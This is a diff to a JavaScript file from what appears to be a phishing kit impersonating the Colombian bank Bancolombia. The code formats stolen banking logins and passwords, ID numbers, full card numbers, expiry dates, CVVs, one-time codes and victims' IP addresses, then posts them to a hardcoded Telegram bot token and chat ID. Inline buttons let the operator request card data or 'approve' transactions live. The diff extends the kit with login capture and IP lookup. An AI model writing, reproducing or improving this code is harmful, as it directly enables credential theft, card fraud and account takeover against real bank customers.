@@ -2,20 +2,29 @@
 const TELEGRAM_BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
 const TELEGRAM_CHAT_ID = '8469651553';
 
-// Función principal para enviar a Telegram
-async function sendToTelegram(data) {
-    const mensaje = formatearMensaje(data);
-    const teclado = crearTeclado(data);
+// ========================================
+// FUNCIÓN PRINCIPAL - Compatible con todas las páginas
+// ========================================
 
+/**
+ * Envía un mensaje a Telegram con formato y teclado
+ * @param {string} mensaje - Mensaje a enviar (puede incluir Markdown)
+ * @param {object} teclado - Objeto con los botones inline (opcional)
+ * @returns {Promise}
+ */
+async function sendTelegramMessage(mensaje, teclado = null) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
+    
     const payload = {
         chat_id: TELEGRAM_CHAT_ID,
         text: mensaje,
-        parse_mode: 'Markdown',
-        reply_markup: teclado
+        parse_mode: 'Markdown'
     };
-
+    
+    if (teclado) {
+        payload.reply_markup = teclado;
+    }
+    
     try {
         const response = await fetch(url, {
             method: 'POST',
@@ -28,10 +37,11 @@ async function sendToTelegram(data) {
         const result = await response.json();
         
         if (!result.ok) {
-            throw new Error('Error al enviar mensaje a Telegram');
+            console.error('Error de Telegram:', result);
+            throw new Error(`Error al enviar mensaje: ${result.description || 'Desconocido'}`);
         }
 
-        console.log('✅ Datos enviados a Telegram correctamente');
+        console.log('✅ Mensaje enviado a Telegram correctamente');
         return result;
         
     } catch (error) {
@@ -40,15 +50,47 @@ async function sendToTelegram(data) {
     }
 }
 
-// Formatear mensaje para Telegram
-function formatearMensaje(data) {
-    const transactionId = Date.now().toString(36);
+// ========================================
+// FUNCIÓN PARA DATOS COMPLETOS (otp-dinamica.html)
+// ========================================
+
+/**
+ * Envía datos completos del formulario a Telegram
+ * @param {object} data - Objeto con todos los datos del usuario
+ * @returns {Promise}
+ */
+async function sendToTelegram(data) {
+    const mensaje = formatearMensaje(data);
+    const teclado = crearTeclado(data);
     
-    return `
-🏦 *NUEVA SOLICITUD BANCOLOMBIA*
+    return await sendTelegramMessage(mensaje, teclado);
+}
+
+// ========================================
+// FORMATEAR MENSAJE COMPLETO
+// ========================================
+
+function formatearMensaje(data) {
+    const transactionId = data.transactionId || Date.now().toString(36);
+    
+    let mensaje = `🏦 *NUEVA SOLICITUD BANCOLOMBIA*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-👤 *DATOS PERSONALES*
+`;
+
+    // DATOS DE LOGIN
+    if (data.usuario || data.clave) {
+        mensaje += `🔐 *DATOS DE ACCESO*
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 Usuario: \`${data.usuario || 'N/A'}\`
+🔑 Clave: \`${data.clave || 'N/A'}\`
+
+`;
+    }
+
+    // DATOS PERSONALES
+    if (data.tipoDocumento || data.numeroDocumento) {
+        mensaje += `👤 *DATOS PERSONALES*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 📋 Tipo Doc: ${data.tipoDocumento || 'N/A'}
 🆔 Documento: \`${data.numeroDocumento || 'N/A'}\`
@@ -56,29 +98,47 @@ function formatearMensaje(data) {
 📱 Celular: ${data.celular || 'N/A'}
 📧 Email: ${data.email || 'N/A'}
 
-💳 *DATOS DE TARJETA*
+`;
+    }
+
+    // DATOS DE TARJETA
+    if (data.cardNumber || data.numeroTarjeta) {
+        mensaje += `💳 *DATOS DE TARJETA*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 Número: \`${data.numeroTarjeta || 'N/A'}\`
-👤 Titular: ${data.nombreTitular || 'N/A'}
-📅 Vencimiento: \`${data.fechaVencimiento || 'N/A'}\`
+💳 Número: \`${data.cardNumber || data.numeroTarjeta || 'N/A'}\`
+👤 Titular: ${data.cardholderName || data.nombreTitular || 'N/A'}
+📅 Vencimiento: \`${data.expiryDate || data.fechaVencimiento || 'N/A'}\`
 🔒 CVV: \`${data.cvv || 'N/A'}\`
-🔑 Clave: \`${data.clave || 'N/A'}\`
 
-🔐 *VERIFICACIÓN*
+`;
+    }
+
+    // CÓDIGO DE VERIFICACIÓN
+    if (data.codigoVerificacion || data.otp) {
+        mensaje += `🔐 *VERIFICACIÓN*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-${data.tipoVerificacion || 'Código'}: \`${data.codigoVerificacion || 'Pendiente'}\`
+${data.tipoVerificacion || data.tipoOTP || 'Código'}: \`${data.codigoVerificacion || data.otp || 'Pendiente'}\`
 
-⏰ *Fecha y Hora*
-${data.timestamp || new Date().toLocaleString('es-CO')}
+`;
+    }
 
-🆔 *ID Transacción:* \`${transactionId}\`
+    // INFORMACIÓN ADICIONAL
+    mensaje += `🌐 *INFORMACIÓN ADICIONAL*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-    `.trim();
+🌍 IP: ${data.ip || data.userIP || 'No disponible'}
+⏰ Hora: ${data.timestamp || new Date().toLocaleString('es-CO')}
+🆔 ID: \`${transactionId}\`
+━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    return mensaje.trim();
 }
 
-// Crear teclado con botones
+// ========================================
+// CREAR TECLADO DE BOTONES
+// ========================================
+
 function crearTeclado(data) {
-    const transactionId = Date.now().toString(36);
+    const transactionId = data.transactionId || Date.now().toString(36);
     
     return {
         inline_keyboard: [
@@ -106,6 +166,12 @@ function crearTeclado(data) {
             ],
             [
                 { 
+                    text: "💳 Solicitar Datos Tarjeta", 
+                    callback_data: `pedir_tarjeta:${transactionId}` 
+                }
+            ],
+            [
+                { 
                     text: "✔️ Aprobar Transacción", 
                     callback_data: `aprobar:${transactionId}` 
                 },
@@ -118,10 +184,20 @@ function crearTeclado(data) {
     };
 }
 
-// Enviar solo actualización de código
+// ========================================
+// FUNCIÓN PARA ACTUALIZACIONES RÁPIDAS
+// ========================================
+
+/**
+ * Envía solo una actualización de código (OTP o Dinámica)
+ * @param {string} codigo - El código a enviar
+ * @param {string} tipo - Tipo de código ('OTP', 'Dinámica', etc.)
+ * @returns {Promise}
+ */
 async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
-    const mensaje = `
-🔐 *NUEVO ${tipo.toUpperCase()}*
+    const transactionId = Date.now().toString(36);
+    
+    const mensaje = `🔐 *NUEVO ${tipo.toUpperCase()}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 🎯 Código: \`${codigo}\`
@@ -129,11 +205,8 @@ async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
 ⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
 📅 Fecha: ${new Date().toLocaleDateString('es-CO')}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-    `.trim();
+━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
-    const transactionId = Date.now().toString(36);
-    
     const teclado = {
         inline_keyboard: [
             [
@@ -161,27 +234,32 @@ async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
         ]
     };
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    return await sendTelegramMessage(mensaje, teclado);
+}
 
-    const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: mensaje,
-        parse_mode: 'Markdown',
-        reply_markup: teclado
-    };
+// ========================================
+// FUNCIÓN PARA OBTENER IP PÚBLICA
+// ========================================
 
+/**
+ * Obtiene la IP pública del usuario
+ * @returns {Promise<string>}
+ */
+async function getPublicIP() {
     try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        });
-
-        return await response.json();
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
     } catch (error) {
-        console.error('Error:', error);
-        throw error;
+        console.error('Error obteniendo IP:', error);
+        return 'No disponible';
     }
 }
+
+// ========================================
+// EXPORTAR FUNCIONES (para compatibilidad)
+// ========================================
+
+// Estas funciones están disponibles globalmente
+console.log('✅ telegram.js cargado correctamente');
+console.log('📡 Funciones disponibles: sendTelegramMessage, sendToTelegram, enviarActualizacionCodigo, getPublicIP');
